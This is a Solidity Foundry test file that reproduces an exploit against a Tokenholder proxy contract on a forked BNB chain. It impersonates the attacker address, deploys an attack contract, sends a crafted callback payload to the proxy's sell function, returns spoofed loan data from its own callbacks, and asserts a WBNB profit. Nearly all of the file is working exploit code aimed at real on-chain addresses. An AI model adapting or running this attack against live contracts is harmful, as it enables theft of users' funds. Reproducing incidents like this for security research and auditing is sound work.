
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 63856734;
    uint256 constant TX_TIMESTAMP = 1759891887;
    uint256 constant TX_BLOCK_NUMBER = 63856735;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        TokenholderAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (TokenholderAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = TokenholderAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new TokenholderAttack();
        }
    }

    function _prepareProfit(TokenholderAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(TokenholderAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(TokenholderAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACK_CONTRACT, attack, Addresses.WBNB, "WBNB", 19200000000000000000);
    }
}

contract TokenholderAttack {
    function attack() external payable {
        executeSellAndProfit();
    }

    function _markRepayCb() internal {
        repayCallbackDone = true;
    }

    function _markPrivLoanCb() internal {
        privLoanCbDone = true;
    }

    function executeSellAndProfit() internal {
        sellThroughProxy();
        collectWbnbProfit();
    }

    function sellThroughProxy() internal {

        bytes memory callbackPayload =
            hex"99270154000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000000001158e460913d00000";
        ITokenholderProxy(Addresses.TOKENHOLDER_PROXY)
            .sell(0, callbackPayload, address(this), Addresses.SETTLEMENT_PROXY, address(this), address(this));
    }

    function collectWbnbProfit() internal view {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    receive() external payable {}

    function repayLoan(uint256 loanIndex, bool settled) external payable {
        loanIndex;
        settled;
        if (!repayCallbackDone) _markRepayCb();
        return;
    }

    function privilegedLoan(address loanAsset, uint256 loanAmount) external payable {
        loanAsset;
        loanAmount;
        if (!privLoanCbDone) _markPrivLoanCb();
        return;
    }

    function loans(uint256 loanIndex) external payable {
        loanIndex;
        bytes memory ret = abi.encode(
            uint256(0),
            uint256(0),
            Addresses.WBNB,
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            Addresses.ATTACK_CONTRACT,
            uint256(0)
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0xe4c61b84) {
            executeSellAndProfit();
            return;
        }
    }

    bool private repayCallbackDone;
    bool private privLoanCbDone;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant SETTLEMENT_PROXY = 0x2EeD3DC9c5134C056825b12388Ee9Be04E522173;
    address internal constant ATTACKER_EOA = 0x3feE6d8aaea76D06CF1ebEaF6B186af215F14088;
    address internal constant TOKENHOLDER_PROXY = 0x616B36265759517AF14300Ba1dD20762241a3828;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant ATTACK_CONTRACT = 0xe82Fc275B0e3573115eaDCa465f85c4F96A6c631;
}

interface ITokenholderProxy {
    function sell(uint256, bytes calldata, address, address, address, address) external;
}
